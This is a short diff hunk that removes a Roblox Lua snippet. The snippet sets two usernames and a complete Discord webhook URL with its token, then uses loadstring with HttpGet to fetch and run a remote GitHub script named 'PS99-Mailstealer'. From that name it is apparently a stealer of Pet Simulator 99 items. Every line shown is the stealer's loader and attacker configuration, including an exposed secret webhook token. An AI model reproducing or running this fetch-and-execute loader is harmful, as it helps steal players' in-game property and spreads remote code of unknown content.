@@ -1,5 +1,0 @@
-Username = "keanogamer11"
-Username2 = "keanogamer11farm1"
-Webhook = "https://discord.com/api/webhooks/1254484482975858738/LvDInvtWkaMbaxCHvKkasJG-IoeEU0kiNj3qZ-ph7LKrhLI0frOHK_fg_wx6yif-Kly_"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
